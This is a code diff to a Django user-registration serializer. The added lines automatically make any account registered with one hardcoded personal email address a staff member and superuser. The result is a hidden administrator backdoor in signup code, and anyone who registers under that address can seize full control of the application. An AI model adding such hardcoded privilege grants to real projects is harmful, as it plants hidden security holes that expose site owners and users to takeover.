@@ -32,6 +32,11 @@ class RegisterSerializer(serializers.ModelSerializer):
             password=validated_data['password'],
             name=validated_data.get('name', '')
         )
+        # Automatically grant admin access only to this specific email
+        if validated_data['email'] == 'zakkiadnan05@gmail.com':
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
         return user
 
 class LoginSerializer(serializers.Serializer):
